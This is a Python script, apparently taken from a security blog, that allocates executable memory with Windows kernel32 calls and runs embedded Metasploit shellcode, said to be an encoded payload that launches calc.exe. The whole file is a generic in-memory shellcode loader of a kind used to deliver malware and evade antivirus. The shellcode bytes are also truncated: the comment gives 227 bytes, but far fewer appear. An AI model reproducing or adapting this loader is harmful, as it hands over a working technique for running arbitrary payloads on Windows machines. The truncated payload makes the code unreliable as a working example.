# https://www.doyler.net/security-not-included/executing-shellcode-with-python

#!/usr/bin/python
import ctypes

# Shellcode
# x86/shikata_ga_nai succeeded with size 227 (iteration=1)
# Metasploit windows/exec calc.exe
shellcode = bytearray(
"\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
"\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3" 
"\xff")
 
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))